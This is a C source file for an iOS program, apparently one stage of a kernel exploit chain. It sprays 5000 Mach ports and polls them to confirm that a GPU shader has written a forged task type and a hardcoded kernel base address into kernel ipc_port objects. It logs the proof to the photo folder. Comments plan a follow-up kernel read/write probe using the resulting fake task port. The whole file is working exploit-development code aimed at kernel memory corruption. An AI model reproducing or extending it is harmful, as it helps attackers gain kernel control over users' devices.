/*
 * HeapFengShui v4 — Controlled Write Probe (Survive + Read Back)
 * ===============================================================
 * Session 159 Track B escalation from F-73 (ipc_port zone hit, v3 killed).
 *
 * KEY CHANGE from v3: DO NOT crash on detection.
 * Instead: read back kotype + kobject via mach_port_kobject(),
 * log CONTROLLED_WRITE_DETECTED with proof data to DCIM, keep scanning.
 *
 * Detection logic:
 *   Baseline: store kotype+kobject for all 5000 ports at startup.
 *   Per-scan: if kotype OR kobject changed → corruption confirmed.
 *   If new_kobject == KERNEL_BASE (0xfffffe004d928000): PROVEN CONTROLLED WRITE.
 *   If new_kotype == IKOT_TASK (2): vertex shader io_bits write confirmed.
 *
 * Expected result (with updated s159_agx_rw.js v[0]=uvec4(0x80000002,0x64,0,0)):
 *   kotype: 0 → 2 (IKOT_TASK)
 *   kobject: 0 → 0xfffffe004d928000 (kernel_base we wrote as ip_kobject)
 *
 * Build:
 *   SDK=$(xcrun -sdk iphoneos --show-sdk-path)
 *   xcrun -sdk iphoneos clang -arch arm64 -mios-version-min=17.0 -O2 \
 *     -framework CoreFoundation -o HeapFengShui_v4 heap_fengshui_v4.c \
 *     -isysroot "$SDK"
 */

#include <mach/mach.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

#define NUM_PORTS     5000
#define SCAN_INTERVAL 0.05   /* 50ms */
#define IKOT_TASK     2

/* From CVE-28858 panic: kernel_base = 0xfffffe004d928000 */
#define KERNEL_BASE  0xfffffe004d928000ULL
/* KERN_LO/KERN_HI as written by vertex shader uvec4 pairs */
#define KERN_LO      0x4d928000UL
#define KERN_HI      0xfffffe00UL

static mach_port_t       g_ports[NUM_PORTS];
static natural_t         g_base_kotype[NUM_PORTS];
static mach_vm_address_t g_base_kobject[NUM_PORTS];
static int               g_count   = 0;
static int               g_found   = 0;
static int               g_tick    = 0;
static int               g_reports = 0;

static void dcim_write(const char *name, const char *buf, int len) {
    char path[128];
    snprintf(path, sizeof(path), "/var/mobile/Media/DCIM/%s", name);
    int fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if (fd >= 0) { write(fd, buf, len); close(fd); }
}

static void dcim_append(const char *name, const char *buf, int len) {
    char path[128];
    snprintf(path, sizeof(path), "/var/mobile/Media/DCIM/%s", name);
    int fd = open(path, O_WRONLY|O_CREAT|O_APPEND, 0644);
    if (fd >= 0) { write(fd, buf, len); close(fd); }
}

static void report_corruption(int idx, kern_return_t kr,
                               natural_t new_kotype, mach_vm_address_t new_kobject) {
    char buf[2048];
    int  n = 0;

    /* Classify write result */
    int ikot_task_hit    = (new_kotype == IKOT_TASK);
    int kernel_base_hit  = (new_kobject == KERNEL_BASE);
    int kern_ptr_hit     = (new_kobject >= 0xfffffe0000000000ULL);

    n += snprintf(buf+n, sizeof(buf)-n,
        "=== CONTROLLED_WRITE_DETECTED (port %d) ===\n"
        "baseline kotype=%u kobject=0x%016llx\n"
        "new      kotype=%u kobject=0x%016llx\n"
        "kr=%d\n",
        idx,
        g_base_kotype[idx], (unsigned long long)g_base_kobject[idx],
        new_kotype, (unsigned long long)new_kobject,
        kr);

    if (ikot_task_hit) {
        n += snprintf(buf+n, sizeof(buf)-n,
            "IKOT_TASK_WRITTEN: io_bits=0x80000002 confirmed in ipc_port.io_bits\n");
    }
    if (kernel_base_hit) {
        n += snprintf(buf+n, sizeof(buf)-n,
            "KERNEL_BASE_WRITTEN: 0xfffffe004d928000 confirmed in ip_kobject\n");
    }
    if (kern_ptr_hit && !kernel_base_hit) {
        n += snprintf(buf+n, sizeof(buf)-n,
            "KERNEL_PTR_WRITTEN: 0x%016llx in kobject field\n",
            (unsigned long long)new_kobject);
    }
    if (ikot_task_hit && kernel_base_hit) {
        n += snprintf(buf+n, sizeof(buf)-n,
            "!!! FULL CONTROLLED WRITE PROVEN: io_bits+ip_kobject both match shader output\n"
            "!!! Vertex shader uvec4 bytes written to kernel ipc_port object\n"
            "!!! AGX GPU → kalloc.192 (ipc_port) → CONTROLLED KERNEL WRITE = F-74\n");
    }

    /*
     * NOTE: mach_vm_read(fake_task_port, ...) is intentionally NOT called here.
     * The kernel would dereference ip_kobject=kernel_base as a task_t struct,
     * access task->map at kernel_base+map_offset, and likely kernel panic.
     * The kobject value proof IS sufficient for F-74.
     * A dedicated s159_kernrw_probe.c (v5) will attempt mach_vm_read with
     * proper crash containment after F-74 is confirmed.
     */
    if (ikot_task_hit) {
        n += snprintf(buf+n, sizeof(buf)-n,
            "mach_vm_read SKIPPED (would kernel panic with fake task ptr)\n"
            "F-74 CONTROLLED WRITE PROOF: io_bits + ip_kobject match shader output\n");
    }

    dcim_write("fengshui_v4_result", buf, n);
    dcim_write("fengshui_v4_status", "FOUND\n", 6);
    dcim_append("fengshui_v4_log", buf, n);

    /* Also stderr for syslog */
    write(STDERR_FILENO, buf, n);

    g_found   = 1;
    g_reports = 1;
}

static void scan_ports(void) {
    for (int i = 0; i < g_count; i++) {
        natural_t        kotype  = 0;
        mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i],
                                              &kotype, &kobject);
        if (kr != KERN_SUCCESS
            || kotype  != g_base_kotype[i]
            || kobject != g_base_kobject[i]) {
            report_corruption(i, kr, kotype, kobject);
            return; /* one report per scan cycle */
        }
    }
}

/* CoreFoundation timer plumbing (no header dependency) */
typedef const void *CFRunLoopTimerRef;
extern CFRunLoopTimerRef CFRunLoopTimerCreate(void *, double, double, int, int,
    void (*)(CFRunLoopTimerRef, void *), void *);
extern void CFRunLoopAddTimer(void *, CFRunLoopTimerRef, void *);
extern void *CFRunLoopGetCurrent(void);
extern void *kCFRunLoopDefaultMode;
extern double CFAbsoluteTimeGetCurrent(void);
extern void CFRunLoopRun(void);

static void timer_cb(CFRunLoopTimerRef t, void *info) {
    g_tick++;

    if (g_tick == 1) {
        /* Phase 1: allocate 5000 ipc_ports */
        mach_port_t task = mach_task_self();
        for (int i = 0; i < NUM_PORTS; i++) {
            mach_port_t p = MACH_PORT_NULL;
            if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS)
                break;
            if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
                mach_port_deallocate(task, p);
                break;
            }
            g_ports[g_count] = p;
            /* Record baseline kobject/kotype */
            mach_port_kobject(task, p, &g_base_kotype[g_count], &g_base_kobject[g_count]);
            g_count++;
        }

        char status[128];
        int sn = snprintf(status, sizeof(status),
            "READY ports=%d tick=1 scanning@50ms\n", g_count);
        dcim_write("fengshui_v4_status", status, sn);
        write(STDERR_FILENO, status, sn);

    } else if (g_count > 0) {
        /* Every 50ms: scan for corruption — keep scanning even after first find */
        scan_ports();

        /* Periodic alive ping every 10s (200 ticks × 50ms) */
        if (g_tick % 200 == 0) {
            char ping[64];
            int pn = snprintf(ping, sizeof(ping),
                "ALIVE tick=%d found=%d\n", g_tick, g_found);
            dcim_write("fengshui_v4_status", ping, pn);
        }
    }
}

int main(void) {
    /* Remove stale result files */
    unlink("/var/mobile/Media/DCIM/fengshui_v4_result");
    unlink("/var/mobile/Media/DCIM/fengshui_v4_status");
    unlink("/var/mobile/Media/DCIM/fengshui_v4_log");

    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(
        (void *)0,
        CFAbsoluteTimeGetCurrent() + 0.3,
        SCAN_INTERVAL,
        0, 0, timer_cb, (void *)0);
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopDefaultMode);
    CFRunLoopRun();
    return 0;
}
